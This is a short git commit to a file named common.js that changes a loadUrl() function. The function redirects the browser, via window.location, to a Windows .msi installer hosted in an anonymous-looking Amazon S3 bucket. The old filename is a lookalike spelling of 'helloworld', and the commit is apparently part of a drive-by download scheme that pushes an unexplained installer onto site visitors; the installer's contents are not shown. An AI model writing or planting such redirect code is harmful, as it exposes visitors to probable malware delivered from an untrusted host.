91ae7c0fd26da2f9be9e249b463414a45866653b
woshiwnidaye <kwnzhwkjdhekwbsg1762@gmail.com>
2025-07-13 19:03:53 +0800

    Update common.js

--- common.js
+++ common.js
@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://eythw.s3.ap-southeast-2.amazonaws.com/helloworId1.msi";
+		var url="https://eythw.s3.ap-southeast-2.amazonaws.com/helloworld00.msi";
 		window.location=url;
 	}
 }
